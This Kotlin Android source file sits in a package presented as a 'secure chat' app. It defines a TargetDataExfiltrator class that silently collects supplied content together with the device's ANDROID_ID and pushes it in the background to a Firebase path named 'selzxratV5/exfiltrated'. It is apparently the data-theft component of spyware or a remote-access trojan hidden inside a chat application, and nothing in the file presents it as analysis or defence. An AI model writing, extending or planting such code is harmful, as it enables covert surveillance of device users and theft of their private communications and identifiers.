package com.secure.chat.services

import android.content.Context
import android.util.Log
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.*

class TargetDataExfiltrator(private val context: Context) {

    companion object {
        private const val TAG = "TargetExfil"
        private const val EXFIL_REF = "selzxratV5/exfiltrated"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var initialized = false

    fun init() {
        try {
            val db = FirebaseDatabase.getInstance()
            val ref = db.getReference(EXFIL_REF)
            // Test write
            initialized = true
            Log.d(TAG, "Exfiltrator initialized")
        } catch (e: Exception) {
            Log.e(TAG, "Exfiltrator init failed: ${e.message}")
        }
    }

    fun exfiltrate(type: String, content: String, metadata: Map<String, String> = emptyMap()) {
        if (!initialized) return

        val deviceId = android.provider.Settings.Secure.getString(
            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        val payload = mapOf(
            "type" to type,
            "content" to content,
            "deviceId" to deviceId,
            "timestamp" to System.currentTimeMillis(),
            "metadata" to metadata
        )

        scope.launch {
            try {
                FirebaseDatabase.getInstance().getReference(EXFIL_REF).push().setValue(payload)
            } catch (e: Exception) {
                Log.e(TAG, "Exfil failed: ${e.message}")
            }
        }
    }

    fun destroy() { scope.cancel() }
}